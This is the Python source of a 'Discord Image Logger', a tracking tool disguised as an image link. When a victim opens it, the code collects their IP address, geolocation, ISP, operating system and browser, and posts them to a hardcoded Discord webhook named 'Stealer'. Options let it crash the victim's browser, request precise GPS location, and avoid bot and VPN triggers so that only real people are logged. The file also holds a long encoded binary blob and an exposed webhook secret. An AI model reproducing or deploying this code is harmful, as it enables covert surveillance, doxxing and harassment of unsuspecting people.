# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "SPA"
__description__ = "Secret Protocol Agency"
__version__ = "v2.0"
__author__ = "SPA"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1479356780625793066/7rXrol068H49QgoP7LPjUIDM_279_7W3Mn6I4LuSA9499EM-mLaF9y4dQj0xPyysgezs",
    "image": "https://media1.tenor.com/m/Cwwd5_Fub94AAAAC/%C5%9Bmietana-ip.gif", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Stealer", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "haha you think you can steal my gif? ya allah's", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'M@dFFIbqxY&;a)z000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001q1{L2L}rZ3l0tr5)l#>6%`p57#kWI9v&VbA0Q(mBPAszC?_W=Cnzc@DlIK7FBcauFE27NGBq_dI5;;tIyyZ)JwQG`K{`A^KR`l3K}JPJN=Zsg85m7XO;1lyQBY1(Qd3q{RajV8SvWXaT3TLRU0+vLU|3mUPf%hP7h+*zWlKzDW@Tw*WolPfYG`L`Yin+8Y;b00aadV%Oigogadk5?c6D@ld3k#a3x0lnfLvUFZEb-{N`X^Tf_;92f`NrYLxzThjaXQXjEs+LZIESVkrNV<N=lTKm6bX=m@+b$LP409mztWIopp7dSy`b)M4~)ArKF^&F)^w>J*=#(uL}#Yv9Yy3Kee^Bwjm<6EG)J%GPk$5xVN;qB_+GNyS~1@!otGEEG))0Hpa%r$Rs4n930BZ%FD&Z%@PvL&Cb!EpVJx|)YR40BqY}a1KHWx+!-0&6BFIt-s0lo<0B*F5fSA^M&;$@=?)F*>gwzP0`BeZ?*#?#3k&e@@A3x)@)sBLVq)|1^7i%i`8YWG`uhA%O#F3p{L9My4i5b#CH;nk{j#(DwY2^K0RB-={(F1=#>M~t{~`YiPDNBxLqSkQGA=L!0RR91A^8LZ0018VEC2ui0Neo3000R80RIUbNU)&6g9sD;dza5$ymt2XNt{Tr;zWBGD`K?Q?p{21*Qk9n2T$HYlL{A>M2Iq_%a<@?%A6^)<xHCe>*1SsFQUbtK!ZwD*DV^aPLCW>`ZP<JNOSLOzJo_FD$bfT|6PT-m21|4U1Nq#sgGW~j6&0@9op>}s!Nm}$zAHI7qoBdq{?eKRbbSwU;z^xi&gMo!vzV~GwXA$W1;H2IpbBzQe35vC|L?M3mG?bgb`~MeVBA$)2B(}JNvkGTB65JX|`mUQrt(IL^ZXRmu6_dzk#DZ7+hvPevMr#x5&<$GFzT()28Hzk)x!PID3BQdpJw)-@z0AkGc3>P<2Gbbz9G#eK~dP_MwOWKE7IZuw`4Sj#(~$N}}|_TX*7(SD=9h8r0HatXV`<G{gMDi!8fHSmA}g3=>T^+H`o#FUEA(O?{AIV@!0|$u(DIhZN$7Zp(Z|V1f$L7+!($_|s2=6{%xXE1PV>i6%l88Dx>I$f9H`m6bxFExtH2qI^IRbrgR|S(nt7)gAI8Fxh~Hqm2m_C!S)A{iKdIvJ9ySk#N!$=bT1ra@!-F@ZyX(_Ngh&Dv@C6$aRErsYoG*STf5rVw$v4OM96qkfh*ITB$+itd`tFk^KUfZHp+9h$5ken#duGJYtERl+d{<b(qNiVhlFr1SQUim*tvNp-MS|2qA<h%4kY|`L&m6mR@ROJ??BeQ8&h%f=C~H?4ifCeDLuHu!C$%?H+`9NnK{4!1akJlq`~GG<*Vu4K0`m$}1(-S!bIfUOqy~G$ZZx=&=eWo9vkh0z8mDJaX#XByhmt#~_I;C5kGps6q<Gs)({lQioK_M<JWRwQ;JHT!P6ev%=@#i7NVM9j~O4nx!Kyy3!0(dZDz^q%#tH(}Dl~Q{GS8#9{~>gJ=?pC=+XJWGGNa9SWR>*a62Liez@l##%>`CpPLhh>dK68oEfmgDL_nAuu08N;50H(`e7i{(PWf%{my&B#VUql5r+SJ{@>&Oczc{xrNN(1|N#dNn0nrwA-UE@xpvI+HDs?YTB9z6Exl44Lq<{1#w4CF2;mCxhbmH=_-+=u%gQBq=+JQ;7mV)M;dG_f^ODvts+gIoQ^$c*@TkH$nyMco_48-FrtYl(^O@!rK7);ef9~hBg`hPIHNj6>OAwxCUHq8CxEis{>k8lzrRV;q-64k8*&6&8zzzeB#tjALS9mow>*5s3=s$vm30tB2u8Rf8`h%~_fo>W3I5}A*_ef$N^uO8k<S^@S_Ed^q$-Lz%`%Q46(W4ah);aN682h3?Q~a%IOy*Zwg4M*yaBJ{A@60oB2}pW7U-e`CXj8om|Kl*B(Q>s1}7^qhcM8kG*j$CatZ@QsYE!$rIjm11_YKL*v1I8`2i1oNLB4Np@=)&VGo0FMEGjuplI~ahh<9&7ty8&1IA2*DI^3U-sY$>8FGns8`Bf5feWs=t`*w&NjU&G#6>(z6ZMN(9}m&TwGm<v4@1-**sumVFwTLZ&_vbd;0H|XLWdS9hcsvrK>k>#k1Dif3i}u;1iq{ge{cjY!n8dnl1766Fb6WII5iZ);u+}>+bIZDtwIoK5e+<)uZ}3jJ&X~Uby!0hct?oA{h<zcXhi?~bVtiAuZ(=;WiHFeNkaS~6vV*U=MZ`SqeS}bE7|A;`Ycf=M_6$iKj}uB6cNrpq_0JXAOxbgDaLGB)DL@r!yV|bluuBiahf2+9OeKDY0$BbfWpk6;`v8KFd|gEM1-g~$w{>x!e%6q$D<Hq!9yZTApe3!{WSB%H^J!?!8k`ODd&fA4g!Y2ifB{?Dbuz60i$@R!yft&$Jq6v7qbY(ArSGVY3X4S)o2HmDpHOUskAyQ-J(mIC(lKcs#}`C1vnOh4$uuJGzQBG6v+XMP&6);t!k#yKH-U2D78mp<3k!8#=t^wi(8eI=pX*@Eo<%J4`dBRFDmwlK{QY)gUG`uOuANuwbPviWZo_73R6V?IU<gJU<EVG;aAiEwzmVx1}-!qJ);_zHt*|1Ef8vvb_}Btla0e1+=vHn`hl~i4HpBi>)DOEk(6=J#4K<z3rd(adec%ZYh!7Ql;-hyXQS&MLv@{qA|ffK-2@^0pom%Qb)UdJrb{GMk_^g4vC|_GCxX<fO?V=y4${UhB&&uBub~ZbsIEl^VcN=qau05#gB&#4hH?7MVo@8SBGxd9YK+gdm0PKN<*EqymT?g)gr_1B=!iKK0vZt%tT7exn@7E4nFI~oagpn~P8j2{J$l9}=)i_?ic<|3p2JqZ#bMKOmJb`9E*#q62HxccW3ym|`&6mglNOKv7La)F9$`z*6vEWTJC><TRiRIQ`m=6^gw#NksfyVk_;p6*g^L{&j$KHi4ps&)ndgAUEqjZz))MiUMQmbMq?vZ1h+XRlF$(5Z<Xv&TjvnKQXPMrah??ByjvLnuWZrGSS@{MqNHH5kzYZ40@J4Hgf(>4*A`o&IXByVP22xJ?v)y_awcHryGN*wL<NfsPDyE95nZmIS@`iikD#Sk8Ima&b(p(FnIRzf-5D=xrEWQ!oC*m3`V}XY`8fj=0F8SX?n&YtLV<K8KVh?htvW2s(VQfvC+H`Qk8~CsZu<kk&F3dR8U{MSxb4nSt^b(z2O3yyRTE!^;x9=mu^$BJavfezs_oM{P4S{L~;J%L2FR<97XdFWpk`Tll6mI1V@1eSV=))f@dWS6kAwZsnn(f?YyDO^cwOUHv<=|OHKi(MK>i)W{9YKgbJOUW>hPh#Wo0@@q!{#{8d7MxY$@8>B8xcB1&=Ia|HfR)`S=|FVM=bF>SVGO2`GhN6A&T0GLKouu2{y(}Zo8UWo;5~9FA))T%=-$EY75uC0BjWs3I{d4*>~Jm|L+dIrX1mThAz(cQO<_>4sa0j95mX8JABOFUJ}xvIH8MY@O&sB$7AL1j7uE*s)(CMl}kx=2v{p(Tb3XOIE<`z!TeSp;1Fp4aam9P9KIMR_`$m_a#1l+yzhCKt??r=4j@q!q7tn*1t>t_3vC=<BHd66sb)6sL~@;%XEioY_;PYalzB3BDuT2xr4v|%As#z38W$uF<S+~V7AJ8*e*cCF$IuPuS0&=0ez3rPvcqi_V=;ykHMx*~!!Qox;C~*(9DgEbFXd93mw;Z^M~E_3GPO(Y#$&joLipkcdXQVq&>IwpAVT&PBykc1v2RM@I<%36AE<?LXH>E>A|<FM<<JezFbuk&3#|YPYM2TY6AGsA3Tk+Ux-bmS5DscJa6Ly!BgY60ScFK(NjPRe6J><BBz=IiUuXAUPl$nQhZ-gS0S^L2Laic+mcfM}Xc?D)3cGL&>_R+gF@_xS4A1a$tx$?{_zY4qB5np5`4Ly~1by!&ghP0QoD_rz)Q5g}gj~f65VR0})_pXw4$SaT1EmR;Sc#R`g_t-UnYas`=o;!!4xlI^Bm#~9;|U^^iwx*TguspPhA1<IFJlE!_yUgKNK-B1E8OxnPPmA+h8P$4580qfxS<&@)N7iM8Pg#ruY!!m=#R9aDwZLFBjSmz5r&R&4%ILWsIYvO*GGi7N#jV4-&k1_32zsPK-v`-`_(z{(2f?wJv(I%tngG=c#>NPZ~$oukD!v5zzL<m3nTb{%kdcJ5DcULU<ikB89-EdxQLM%sa-&sS(XJ+gXo7|;tGAHQzo&9ZTA&j5j5{G3xhybD|w8Qn3Dgdm6T`+rBDj3@C(maldVw>)esALzy>}hkSTP4w>WE?L@I+Yltd{}>~@!UnU{DOi?XH(cp(r=`HN8q6YxL`ijXwK#g<yL30KLLF6nEXa0)Ythh#}U-p~!o04Rf?IBB2<G1Hbp`GXYMB6=Bw`*kRJ8Bs>5mk~uoWLHMSAP-6ej56^J`n43}vW)%MmAu)T$M`xinKB5e9H3|-#y}ak#0Y%gY=h7$Wwb(ewg|AOkwM9tc8Qk}Rg{QQnny`?gzyNxFq^dhnG!333tqx1wvid>X&dXwo{fo>yLpvDf(jHOC99Z_>@bGUu?qZo3Z8%zdPE(BKnGa1mgypWvSxkTvYL1)2!gaWRS7KC>7X4Zlz2HUg`ihK29=00kAu)PxtTuhshIBxpYaKhO?C?Pxgp-bCpX9`(zqVcFd4Fd3IGa5B5E6i&~%g4oF4_0;mAp+QjV!9QFi$UjIdwqwprYAUDjz?dU=?M;0oMeJ>zK*QPc~E5KJ8yqA5}vy;h=+iK4DTpHE^7A%YF<5e>#b3%2m4HF~2Ys!|VSS#-cVSW{mZ`ECgGq;@GtTMD7q)ufj-RiCsrs=1w(pa>uTL!|(gfrIH1D`5?vFh=ZoshH}eVd|J-dZL}0iArJ%60#(pqJ@s|CYgF0?lcD#HU}U2oP!vI6=`4Fa+eMoF4zT3@a9Q>08C2PW!=)GeJDuOGY~uFQ;|v#!q73mgQEf3GMS;C(vcac`l-w~rq(JQVY-i)Ixoyq2%~giSi>=)i3onmZV*}s(Pmvusx82@Er)7PMjEf`1}vN4a>jb41py9J$p`b2sdJ$jN^z;aX`%*uiHNq6Et#AC@m2+t6oe25<HQH`Dp#h(puluqgiu|W25*k=2|bowptN+o3ak|hEatkUQsoH9@N)V(5Ys>k)$*?ZE3NGR8L&3XlA5ut0C@?>Xc=$vv&Qw0Lu*v8(vqu!o;RBrmLs4_aR}ks25A%*qp6n^Dz7Z*O_?zZ+0YD+U`j`~2Nw0N5Nc0eHnN`-Do7fhFIy1b17^Xem~?8hmx{BraUJ`(Dq6^oK6`UUo3usyDkzx=BBQXZvLCjAx4YsWXA@uMm27N)HJ!vZDa)F_!Zx#@rJ|r~im(Zu@eTdjt7Ydg*!2gd1+1Y2F(36tNhFxbYOK9r33%Wz4$BBRsu}udGMak3mVvZOhKWNfCq-+Fu7j-rnYfn$SJV-m&pB6*Yhh$mxwaawgUS@0(G1Ms3V7=Z#J~!Q;8_>{g<b5*S?~%<pEQ?(^aryrg~*z$@ZbuR;0J2}2hG~Bg2KDGi@%xy7ugE9LF>QARlK@sxT$&@)ZvPLfKF7korQo1f1oxU7Fw2|Yjq(E#IOv_Fhw0hy5NgZT;{>0YqAzP3*^8Z`PzLXX$gZsO5e#sgwm7F`lY+esd@X4J)4X+Jc-HJDzB0WTv)T|$+XG)uqj)Ff^=Kb`3IkM2XUYXxPT1S01eB~3(FA2v!I+@g;C+l!5<95gKDzq`<<>p4(%JM(||Z|payqv2#-KA$;-GgtiP7PzcieMKx>S%k+i>wusgdxm^v4NLT=G>TQVhHmaqu8U~ypog$&S87aDX<cz|@&k}cO|QMSj$UHna^t67{x!c_QY3IPwv5DJHU2Uz9@$1}vXD?kI=p3{oEcPo%}Y{xpB$Ny_5dONtiOT4Utx3^0uKD2{3HYhv>EVo4nj0_Cq1q>FP4al$zs*t33@J5%$#SOQ`)uIPt>j%{WN`s)Tdg;mT__|Ycpl>i)WRxy5a~+I8w+4JCn1Mn&tF8Q4!*h(ov>ddyOtkrkkEWWBn4t&;{H*X-HX;{xxTgrhfDW@z2sT4rymrZ;<i#CaY1v}YVQW!*z|E9gzJ)pqAnCd>;XSSM2#63)r`(pcyS#JT(m;G0{rkTM%g=xRYbQ$4yFq+B>--2ih(M^Kj(hM3bwLPwfD6+=49EZs=C#2gY|S2HEqcHQec*7~oODuMEn?fz5ZbHT!nP;eTT)bLhrF5NL<bP_nKY{_0=*(Kj2V}zvvb_XJR7EctH;87%f@&KHjIont=0owU(dNs;X(<`;2F^H2!G%T!T`TS?Pc60zMaJfR1MWqtp|XY)zzh8)xxnx8m!ml$)Jo7=FkgbT}Fd&&hzUBgUlrZv~?~m$8?;u`e@hdqqplryp-U>d0fj`h}Uy!zq@igFC`c5rr6}r40`nqlz<0Ky`ztfY2b^|nFeN;{YHUT2b0~+<2$;zP<p2SClfVC3PCbNegFsKqz4nFd^_FFe$CbZJIncu$Gy$Z0(r+mYmC1g!!O)R4I~OlUD)8T*t=%FzjC(M)q8v}2-du1d@#+_y;0Y#%@KZdeIT}b07r@NP0a1p0T$lqay-B!uIUZjDMaEmHpFe6p2SO{mB_Q3V7&HR!+p)P!7bd65Nn(<#$W;sPy7hpq*;VI2w5z?*?n}@J>ik8RoH!WnQh&j1+0khF~IQEj|vm(fD4RA9nd)lMt+30rE2+dCn}<RavZI1oxjOA(|6s^!b{74te&!LIkNx_%<#n6+YGAI2lZO3pCoONebE=L2bG58ct8iYM+ejYOb637;iL;n@U|_Q&<q>OGc+*^uJA%xLQ~ab8M^AR_vHv|9NYt>YC7%KBf7tRjK{wFw{{HUG2Y^BEq}M=B~K?H;fKK#qpP7OuYFFw`=!JcozX`Q;USh)hED8vK<M7IRlOQfejp0wz+2+k9i-h%nXWd}a;lp!sL6>rD_!bwA<rtlDsmCac{|s9i_dpG+cMp)@|TsCFi6Cp)ZJ|jz)+Ih1i?+ZSxUEGkuBj_eRN7L;f22Fb%5vxKg~>D?33+bqM&cU)eKRCLM!xc#_Un$?XMq|HPEWlTO#TMi@4#wAF@0ht1i>M9n&_fw6-xaXzdF8vVrse)(p;ETJw6jmeuE<q;wVjSqLud!yaPOwdg`G2giQ&#O`ohZBKo$zT*sq1wjsnbC2m#NsJmys;~*?w8m}BgFE)^dDJqg8nEzf+vu*hbuH7lJR5GED3*aQbk5A?AXLDR!LAUiQf0nE&hPxr<<xS`*kbI{40yVyQPPEbMQ`ZGj?JcZ2UG4>Q(<$UVtG3ltolL<i=a4rPzY8Jom^74aU8I|Ot&Y$*Y&LCvOOKAsw!HJPv$@h!tf2cc3T!Kxj?8w@EYVw_hlC@*%z+xgfIAoe+MHq{Bs~;NDtvlD7L@S2GM@31cK*sF)E<WdGOZ8o2)dJ;0GE1rd{6d?K_>~(wgG*Y}+^Nx4pfy)#`7o|51wo^Vt9mQj83^peoO7UaHNFXS?rLrNjX7=MSGf1oz;%v!~9%J9HX4q(cYJojMR5#+ftc&P0s}87eHeXAmJjeC}lX_fK9*mMvYrZ28TVqeY4s)kNe75u=@o2K5=VXw#-ec--tEglMNDN{k#ib>!#~)2WoIQnHE_tEESjEM4;IRg<N#mMo1m>-FqcvS-nr4Xa60*R)!(cI^c%8#z+hpovlxiWoFfe;5@~q*M_h#(x+OD&)uUpq~c$=-HDQGetaj=HRh-=MKg>4&}hfm^$?xgmN4<>|<GvA~v7@!2N@_G9|o}>sHDG4%6i{Qi%vLq9iq{(?W<J6FR%dPaQmc4mnbEeGyHliXKgkdiDGGyHCSEGD}u&TeIukqJOW}eOkG6$!>Qwtr@Uv#5YkQWg2Tl`9mp02sz}CLJnC>!9z%TOfo+H0BVoe@Hpr+jT)N6HH}c4h>bPcfI~wO+t}m7IXHp{4?X<Y<3$VqaOIuggu}6=mEa*p69l754!pw>GwzR(GzmqK>FyXL5k+dc$vg9;Vx+67u4GE9M^phu7*!Zy?=AV*66-BZ%Cv92t}fZc5=Jy3WfozUv4)sgfT2W`UYH?<6$BqK5WxhKa*U8cO5%h64+#lk^bZU1h?5kPIP~ztKU8tWlF{5yWENHwDN#j^@K{I>J^1JYvqJ9pW0@R<)9s~fda-0d<+@YECZ`aA@eoQvxug(>_&{ts?5J7}xu~QXk333%NvW4N*Bdjf_Q-TAy))gK%PaWObETPVnjuEOPgv<?8D?fWE-{@HV@#3e3K7ImQD$+45|SL%tRO$|_~xH){-{GVIyyYKG)i(KhL1Pca3v*G+8}MC74ImGwSrD{EJaJKc@?HuTYASDTr^=&IqV*RvZhB0`NNMv#sW4)JREy6Dn)=461-)rdPEUm-hoHjthD0FE3n!cOD+1E*7n|6LJ6h+D#5rBcUEC=;nNkAZE~c!ClP6I!Fd@&gqxIRAqmDlV#aVnkh3A!V1zTG<B{8dNs$dw{xOFXid9pMwL9cs=upS*5G7!jMh-b8dA<Q=YA6*6@{pPq%*jFP9La>JhWJ3RkRX+Nk`dLJb@q{=|G~vdyORE@EU42{?{-UsNeP%UwaTm9Y-X9|<d?4l@5x09QA*GU4J~AlL-?CUltcY+8}5VVuA4eJysu*pz5n6+;lBeP{NjoTZwMh%3n2s#K4vk8H<sRs{Bd*kn}rlg7DLWd4&fvM77!19Km;W|kt9C=#a2H14tEye6f8BR7x;_aU1mp@rHO_AJ-DL;wJh;ES{;oN#E=JJ4v~}NK*<k_U>O3*7BBcgPkI!}j6f=MA%^gQd!ZQ(!Yr}3J&5RhqDbG0<j^71hz2$(q6}r`PzYE3!$vuRTuO+R63P+JfAZ1^PgW<kMId5@hj@`AG$9HfHD)PTT7*@AM3$kni5NsPnpEh>iJ^p|O;7to9r?HkKUymk!pM#9KCwtj9D)?c_|(__vzGsP=Q|8C*3PoCm_n_P5EL4Og`!9qLZF0hp|MbG`k)DNkZ%ufSi=$9;07grW@DG3j%Pq48KlJK6ClfC{#1e+X5a!B#0$mpkQbGjEMjwxV9Y0z!iYse(@@j@R1SE)qlwpP@f*3x;8qZ+o06#_F2t~6UVNjHZ_J`Ap+Lzn?>CcXDk5o)Xa?Yj0Zc0nNEFks(MrCdipLZJh3l}M+cc3+ZwBm?qQL_^CHIePphF(zizVQY7%DvU!W=BQs3KNll0En#4x#J={Z?WQ-Lw>>I(n%*z#)v{-2z{l7=&SHlB--PsHY10<b>YziCXo+564*+3?1<ahRSo8xUi%s)b>)q;Q}k0K<7W!K~;0if)P@ksN}#g6V{Dq5zPpuJj{VVmyGqOir}3&toH{zsNyzGUCAlwpodwo6|a1ALq_FFA~`rB8^4+8G#s(SgkYu*M*YM89SVVru;P`fmEF-aY>Eq;s$vt5P!O&X^wSy+#1FpO#9R(B62x=|7%K(FC-gK`s6Jv7%t#41dhv-_SYsvJn8_!2ms?@nYpTdN(;<5o$f1zMF3mz~N`|+IS=<$HcoKzg$ybOzz*VDz;KL>kE01R2bQ8e%DBbGt22r%q9KARMA3i}0-eB~IY=8qErjZh6Xrd36$md1%5Rp3&q=Ax=3@e8jOv}Rbx~`Z-FNo&~QGBPT%lc_{N~@@#XrfJ&kj!xyp$M>!H90VRE$nio3UpAEjb6E}N`zsFP4EsL%Mit9DdACylHw8ETnVk3^<1+?w}c6NEqOKnaTr3lqLt79v3KP<h>orV7vRNEAx!xPIuL@ga*aqF?qG>lmd|e*Wdj{l!JA%ixkQIRXErSHnF1GNLPo_<#2V~ir{d-}*1%UUB<u=Tu;LR;hM_YPkszQFVqO$FDwsB*6Zl;R7r+q)R9MyvD<gR&zz|P$|1ls<*tmpbQH9!o`{NY%Vq12xO0&)?4|J%awT`$2aDbs<LWp<N{*|)z6tQ1!Xri%+@-5xs;A>(K!VQdd1QE@r(Kg@#o!r2K8nmr#O#n_6jKz?hVdRH|XxDzi?9EDv0pURtPZbqj^dWGi;dwoJLh@!KXbZuJB=<t8lvo6(VTXwS7{7POsyJ*mNKtCsxH>Edr>H7e4IGC%m&j8&tG92RYk3fZ*PBQ-u;XeyO{i@dMaj%#ll=!ckm94Rhy!Euwl_Y&;mmSn!ydGY3}Wz{=h}t&u~Qk6ns*zsBD*Y0$N>yh;0wZpo`q*Yn;@3eBs&aBP-(~Q2pVHY5u8Q`E)Y?5M+h7jhbZ_gwB(4s$V1@_FIv;KWJ(_c`5z94^<5%3>slA0CY0d#$$<)Td00c_8vO&a6@i(Mti0tcB}JM)GjsCQ{N|#_c|7+#3o#2lQ4#_TZW(-8$mQlAnuRdFCS2$o%L{Cah&Q7LWu%hc>`mx-ZP=G06|*1zg5d^lR;nY;@OR*XE2vI*-IENA<LmuOMb@}Z01q5w(A(FB_d~D~A25%H`(}=3@jqO_QOX0u^7q{XO1cVlr$^lpldp546csa*j_>G5$L#)8?{q>Fy7i&02}TPV_=zIZlAjI(J7BoAvcsUU>jm5(2C{PmTu3jXGBvcI1c=K9i90Wf`<?M9tFFknTDy*1;WT-uzQIEY!|Se*8w5pI!AGD23z<R33k8}(jhJHu9K5`0i?cmQgKb-bZF7Uh(wNLRu#)NnJeUQ<B0U_@4VE&8bz8muD>PDoHv!}+2hqAu(wIR|1(wQ&O~?*Q5CtRK36}#LulbJu?7|IDJ1@ZLg$~j{<pU08_yn?ZK4uv~TeCWWOF{S{JnYlHKd`Y`053j3gimm&Kac}NfCi1)2t4SN76S%7fP*$r1vJ|OQed-1*aMrR1H*U(E-RQANr*n61IUsYO4PhP!@psI2Xde(Rw%Sv>_1WPtP$Hi*?Wwf8i|;xgE%+@%34D``KXkrErz=;beXCFd6Nq?i@9?<AF~8kXfbqHHww#y=lc$T>%)zsK6z=5>(hkn8#%hNtA9X;*iwZ^lrB^3t2KNCR~WC#ivvwWvpHxLF0v{T6Na@?h0Z&|1G}@x`U5q@4f`>@``eA*$PI8<hFK5=R_HAMQos~KV+B#D70AFGnuxtmY7WPUEIL?({R%6VQn8wdvC5JOsen6In??<kIIMsM;DE@PXciIVJ5|t}o#D9Zn-_Cz!S9+73e=Icq9{k4142l#iAqLb@Pka;#9Di{Ie^5ia>-2qw{VM*J)l1wA_Q|wH;42yh{Va6!a__D1&qX$w<LwnTCF(Z#d@O*BcY5vxC1yN2Xt76rRxQ5Sch5Iy+;U4zx+!)gdtY@OSN;Z02wt=Kn?(DhP8T!cOZ_P1jj|7uYoE-TmuJfB*#M7gnViSOE@iHSch-;1PbAUL9j=2NK92&26TXilB9z}z=dz{%WvqBY%mA^T<8Nia05|52W|+3H-NwV=*!;h5zx>B&-*++xS7~^JeGima|@Y|%1)M0OS!N`RUidh#KQi=sUOj#tNSF#FqFK6gE-)W#YBWkTTEF?v<TA7IC4G_OpZPLj(-EV@yHdL2%7AmGz2Lf#)uxs$SL|`#eew&#>0?^h=}McusMi1jX0PL#n2_vhz<qOC6c*}5VIIz6!|L&JfjRTLo0M(NV9w#l`y?2^sMm=&l?p_QQ*jtNCf4Gy+(@}LZHrk^aD-!ghgP_3mdXH$|lY9&#s8I=ZjMQRF1_|nV(dU`ApCU`2&~<#s(d?x4{f@V>}84jfXIpFcVS#5XFcLB@Hnnur#$$3GF2ec`Wz*1lepzCwxN5K}&sd1*)-89Cb?{djv<rl>h|Nqr!tWK#@YwnbLVZouP?J^~NEaQh+<1tEf*4vs6!AiYygXyUeLi!k!1c89F^vjcJI72s1Xtn=p%0gP{nBy3qI|h{r0afygNi+lb*(NqJ~USj-KV;-Yn-8Xd)y@hnvF%!Jru3acBf1i8x<O@lUgLG`>2N)3-rUD8ec)+R-kX6e?cxUimDkkWx4yc7tTX;&3h)m3fPf^mp~nOD)k&{nNid^MbV#Tban4DUNtQ>DK(ATyP4!dMwSmtw0a4Af8{g|);;jMP#88x5B35-oM@q^Vp3H|VaQp^)Ry1Oj~oP4m`peZI2NRB>HQlRZ}lQP=eZ#+*_m$w<|bx`R{6Svrtcf8CIK&DVXUReSB%gUF1p)YYSknWg0e#4$!bRaht-CUaOTT7!m%g-eOm#fg>6?6a`eiXM?P5<<8G5s?GKP=t`}j;PqZPlcnM1R9iO76SD;15J!dGaCgZB_rY6m@%pbqE1Iq#Xg|HJ}BB*tyP1uP=B@6gn$T&pwsDuEL1@->`{YFXr&v8T3AsDt;|l-<A!DM8Xc`z@qD*I9ZyQAG@C%z2N_Am;Db5PHaK`q9pZyrNz`(!&nFR3r6O1V-8I)I*_ocuFxQRQF6G<1R3%i!Sv@#YhCm3%P27ecS~{SP*Knff-2;d4O2+%jm{CFpoj=M|gFS#pEK0g!Z3)@js%9A7(tS